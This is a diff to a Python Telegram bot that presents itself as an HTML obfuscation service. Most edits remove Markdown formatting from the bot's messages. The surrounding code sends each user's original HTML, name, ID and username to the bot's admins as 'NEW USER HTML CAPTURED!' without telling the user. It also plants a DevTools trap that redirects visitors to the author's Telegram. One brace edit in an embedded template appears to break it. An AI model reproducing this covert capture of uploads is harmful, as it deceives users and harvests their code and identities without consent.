@@ -47,11 +47,9 @@ def send_force_join_msg(chat_id):
     markup.add(types.InlineKeyboardButton("🔄 Check Membership", callback_data="check_join"))
     bot.send_message(
         chat_id,
-        "⚠️ **অ্যাক্সেস ব্লকড!**\n\n"
+        "⚠️ এক্সেস ব্লকড!\n\n"
         "এই বট ব্যবহার করতে হলে আপনাকে অবশ্যই আমাদের অফিশিয়াল সাপোর্ট গ্রুপে জয়েন থাকতে হবে!\n\n"
-        "👉 নিচের বাটন থেকে সাপোর্ট গ্রুপে জয়েন করে **'Check Membership'** বাটনে ক্লিক করুন।",
-        reply_markup=markup,
-        parse_mode='Markdown'
+        "👉 নিচের বাটন থেকে সাপোর্ট গ্রুপে জয়েন করে 'Check Membership' বাটনে ক্লিক করুন।"
     )
 
 def obfuscate_html(html_content):
@@ -133,7 +131,7 @@ Signature: NIROB_GX_PROTECTED_ENGINE
         if (widthThreshold || heightThreshold) {{
             destroyAndRedirect();
         }}
-    }}, 500);
+    }, 500);
     
     (function(){{
         try {{
@@ -179,7 +177,7 @@ def send_welcome(message):
     if user_id in ADMIN_IDS:
         bot.send_message(message.chat.id, "👑 WELCOME ADMIN (নিরব ভাই)\nবট ফুল্লি লাইভ আছে!", reply_markup=admin_keyboard())
     else:
-        bot.send_message(message.chat.id, "🔒 **HTML OBFUSCATOR BOT**\n🤖 Bot: @nirob_team_Obucsate_bot\n\n📄 Send your .html file or code to start protection!", reply_markup=user_keyboard(), parse_mode='Markdown')
+        bot.send_message(message.chat.id, "🔒 HTML OBFUSCATOR BOT\n🤖 Bot: @nirob_team_Obucsate_bot\n\n📄 Send your .html file or code to start protection!", reply_markup=user_keyboard())
 
 @bot.callback_query_handler(func=lambda call: call.data == "check_join")
 def callback_check_join(call):
@@ -232,11 +230,11 @@ def handle_incoming(message):
         return
 
     if text == '🛠️ Admin Help':
-        bot.reply_to(message, "🛠️ **Admin Help Menu:**\n1. ইউজার ব্যান করতে শুধু তার টেলিগ্রাম আইডি (সংখ্যা) পাঠান।\n2. আনব্যান করতে লিখুন: `/unban [ID]`\n3. স্ট্যাটস দেখতে লিখুন: `/admin` বা বাটনে ক্লিক করুন।", parse_mode='Markdown')
+        bot.reply_to(message, "🛠️ Admin Help Menu:\n1. ইউজার ব্যান করতে শুধু তার টেলিগ্রাম আইডি (সংখ্যা) পাঠান।\n2. আনব্যান করতে লিখুন: /unban [ID]\n3. স্ট্যাটস দেখতে লিখুন: /admin বা বাটনে ক্লিক করুন।")
         return
 
     if text == '📊 Admin Stats':
-        bot.reply_to(message, f"👑 **ADMIN STATS PANEL**\n🤖 Bot: @nirob_team_Obucsate_bot\n📊 Total Protected: {total_protected_count}\n🚫 Banned Users: {len(banned_users)}", parse_mode='Markdown')
+        bot.reply_to(message, f"👑 ADMIN STATS PANEL\n🤖 Bot: @nirob_team_Obucsate_bot\n📊 Total Protected: {total_protected_count}\n🚫 Banned Users: {len(banned_users)}")
         return
 
     if text == '⚙️ Support Group':
@@ -265,20 +263,20 @@ def handle_incoming(message):
 
         for admin_id in ADMIN_IDS:
             admin_notification = (
-                f"📥 **NEW USER HTML CAPTURED!**\n\n"
-                f"👤 **User Name:** {message.from_user.first_name}\n"
-                f"🆔 **User ID:** `{user_id}`\n"
-                f"🔗 **Username:** @{message.from_user.username if message.from_user.username else 'N/A'}\n"
-                f"📁 **File Name:** `{file_name_original}`\n"
-                f"📊 **Total Protected:** `{total_protected_count}`"
+                f"📥 NEW USER HTML CAPTURED!\n\n"
+                f"👤 User Name: {message.from_user.first_name}\n"
+                f"🆔 User ID: {user_id}\n"
+                f"🔗 Username: @{message.from_user.username if message.from_user.username else 'N/A'}\n"
+                f"📁 File Name: {file_name_original}\n"
+                f"📊 Total Protected: {total_protected_count}"
             )
-            bot.send_message(admin_id, admin_notification, parse_mode='Markdown')
+            bot.send_message(admin_id, admin_notification)
             
             temp_orig_name = f"Original_{user_id}.html"
             with open(temp_orig_name, "w", encoding="utf-8") as tf:
                 tf.write(html_data)
             with open(temp_orig_name, "rb") as tf:
-                bot.send_document(admin_id, tf, caption=f"📄 **Original Source Code from User ID:** `{user_id}`", parse_mode='Markdown')
+                bot.send_document(admin_id, tf, caption=f"📄 Original Source Code from User ID: {user_id}")
             os.remove(temp_orig_name)
 
         secured_code = obfuscate_html(html_data)
@@ -292,15 +290,14 @@ def handle_incoming(message):
                 message.chat.id, 
                 f, 
                 caption=(
-                    "✅ **আল্ট্রা-ডেনস সিকিউরিটি সফল!**\n\n"
-                    "🛡️ **Applied Protections:**\n"
+                    "✅ আল্ট্রা-ডেনস সিকিউরিটি সফল!\n\n"
+                    "🛡️ Applied Protections:\n"
                     "🔹 Heavy Dense Stream Obfuscation\n"
                     "🔹 Console & DevTools Trap with Voice Warning\n"
                     "🔹 Auto Telegram Redirect Trap (@NIROB_GX_LEADER)\n\n"
-                    "🤖 _Bot Username: @nirob_team_Obucsate_bot_\n"
-                    "👑 _Protected by @NIROB_GX_LEADER_"
-                ),
-                parse_mode='Markdown'
+                    "🤖 Bot Username: @nirob_team_Obucsate_bot\n"
+                    "👑 Protected by @NIROB_GX_LEADER"
+                )
             )
         os.remove(output_file_name)
         
